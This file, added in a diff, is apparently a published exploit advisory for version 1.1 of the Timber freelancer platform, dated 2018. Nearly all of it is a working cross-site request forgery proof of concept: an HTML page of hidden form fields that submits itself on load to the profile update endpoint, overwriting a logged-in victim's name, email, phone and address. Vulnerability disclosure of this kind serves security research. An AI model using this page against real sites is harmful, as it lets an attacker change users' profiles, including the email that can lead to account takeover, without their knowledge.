@@ -1,0 +1,42 @@
+# Exploit Title: Timber - Ultimate Freelancer Platform  1.1 - Cross site request forgery
+# Date: 2018-05-24
+# Exploit Author: L0RD or borna.nematzadeh123@gmail.com
+# Vendor Homepage:
+https://codecanyon.net/item/timber-ultimate-freelancer-platform/14747284?s_rank=1717
+# Version: 1.1
+# Tested on: Kali linux
+=========================================
+
+# POC :
+
+<html>
+<head>
+  <title>CSRF POC</title>
+</head>
+  <body>
+    <form action="http://test.com/timber/request/backend/ajax/profile/update_user_profile" method="POST">
+      <input type="hidden" name="user&#95;nonce" value="e748717abd" />
+      <input type="hidden" name="profile&#95;avatar" value="" />
+      <input type="hidden" name="first&#95;name" value="decode" />
+      <input type="hidden" name="last&#95;name" value="lord" />
+      <input type="hidden" name="user&#95;name" value="test" />
+      <input type="hidden" name="job" value="Marketing&#32;Specialist" />
+      <input type="hidden" name="company" value="Envato" />
+      <input type="hidden" name="email" value="lord&#64;decode&#46;com" />
+      <input type="hidden" name="website" value="http&#58;&#47;&#47;envato&#46;com" />
+      <input type="hidden" name="language" value="en&#95;US" />
+      <input type="hidden" name="phone&#95;num" value="&#43;33&#32;&#40;0&#41;1&#32;42&#32;68&#32;53&#32;00" />
+      <input type="hidden" name="country" value="FR" />
+      <input type="hidden" name="city" value="Paris" />
+      <input type="hidden" name="address1" value="8&#32;Rue&#32;de&#32;Londres" />
+      <input type="hidden" name="address2" value="75009&#32;test" />
+      <input type="hidden" name="zip&#95;code" value="" />
+      <input type="hidden" name="vat&#95;nubmer" value="" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+==========================================
